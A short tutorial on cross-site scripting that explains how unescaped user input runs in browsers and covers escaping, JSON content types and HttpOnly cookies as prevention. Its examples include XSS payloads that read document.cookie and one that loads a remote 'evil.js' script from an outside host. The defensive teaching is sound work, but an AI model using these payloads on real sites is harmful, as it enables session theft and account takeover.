# XSS

> Cross-Site Scripting

Cross-site scripting (XSS) is a security bug that can affect websites. If present in your website, this bug can allow an attacker to add their own malicious JavaScript code onto the HTML pages displayed to your users. Once executed by the victim's browser, this code could then perform actions such as completely changing the behavior or appearance of the website, stealing private data, or performing actions on behalf of the user.

> XSS vulnerabilities most often happen when user input is incorporated into a web server's response (i.e., an HTML page) without proper **escaping** or **validation**.

## Basic example

Say you app take user input in a textbox, save it in DB and then show it in some HTML page. User can provide anything in textbox, even HTML or javascript code so when you display user's input back in HTML page then that user's input will be executed by browser because it either HTML or javascript.
For example, you ask user to provide text and user gives you `<strong>Test</strong>`, so when you display ths is in HTML page then browser render it in bold text as **Test**.

So, without knowing the application code, someone figure out easily that the application includes our own HTML markup in the response. That's interesting but not terribly dangerous. If, however, the application also allows us to inject JavaScript code `<script>alert('hello')</script>`, that would be much more "interesting".

If attacker can run script in your app then javascript can be used by attacker to read application cookies, localstorage data, browser history etc and then run ajax request which send the cookies data back to him. For example, if attacker can add `<img src=x onerror="alert(document.cookie);"` to your app then he can get cookie data which contain session id try to use the same session id to authenticate himself as owner of the account.

What else can attacker do besides popping up alerts or stealing session IDs? He can pretty much do anything that JavaScript allows like `<img src=1 onerror="s=document.createElement('script');s.src='//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s);"`

## Prevention

### HTML escape

> Escape Before Inserting Untrusted Data in HTML.

> Use template system that do escaping.

The purpose of character and string escaping is to make sure that every part of a string is interpreted as a string primitive, not as a control character or code.

For example, `&lt;` is the HTML encoding for the `<` character. If attcker provide:

`<script>alert('testing')</script>` then after escaping it becomes:

`&lt;script&gt;alert('testing')&lt;/script&gt;`, and when it render by browser it render as:

`<script>alert('testing')</script>` but does not execute because browse actually see it as `&lt;script&gt;alert('testing')&lt;/script&gt;` which is just a another text for browser than script to execute.

### Attribute escape

> Attribute Escape Before Inserting Untrusted Data.

```html
<img src="...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...">
```

### Javascript escape

> Dynamically generated JavaScript code - both script blocks and event-handler attributes.

```html
<script>alert('...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...')</script>
<div onmouseover='x=...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'</div>
```

### JSON request

In a Web 2.0 world, the need for having data dynamically generated by an application in a javascript context is common.

> Ensure returned Content-Type header is `application/json` and not `text/html`. This shall instruct the browser not misunderstand the context and execute injected script.

```
# BAD

HTTP/1.1 200
Date: Wed, 06 Feb 2013 10:28:54 GMT
Server: Microsoft-IIS/7.5....
Content-Type: text/html; charset=utf-8 <-- bad
....
Content-Length: 373
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
{"Message":"No HTTP resource was found that matches the request URI 'dev.net.ie/api/pay/.html?HouseNumber=9&AddressLine
=The+Gardens<script>alert(1)</script>&AddressLine2=foxlodge+woods&TownName=Meath'.","MessageDetail":"No type was found
that matches the controller named 'pay'."}   <-- this script will pop!!
```

```
# GOOD

HTTP/1.1 200
Date: Wed, 06 Feb 2013 10:28:54 GMT
Server: Microsoft-IIS/7.5....
Content-Type: application/json; charset=utf-8 <--good
.....
```

### Embedded JSON

```html
<script>
  var initData = <%= data.to_json %>; // Do NOT do this without encoding the data.
</script>
```

Normalize JSON on server-side by converting `<` to `\u003c` before delivering it to the browser.

### CSS escape

When you want to put untrusted data into a stylesheet or a style tag.

```html
<style>selector { property : ...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...; }</style>
<span style="property : ...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...">text</span>
```

### Escape query string in URL

When you want to put untrusted data into HTTP GET parameter value.

```html
<a href="http://www.somesite.com?test=...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...">link</a >
```

### HTTP cookie flag

Prevent cookie stealing by evil script.

When you tag a cookie with the HttpOnly flag, it tells the browser that this particular cookie should only be **accessed by the server**. Any attempt to access the cookie from client script is strictly forbidden.

* It restricts all access to `document.cookie`.
* XMLHttpObjects may only be submitted to the domain they originated from, so there is no cross-domain posting of the cookies.
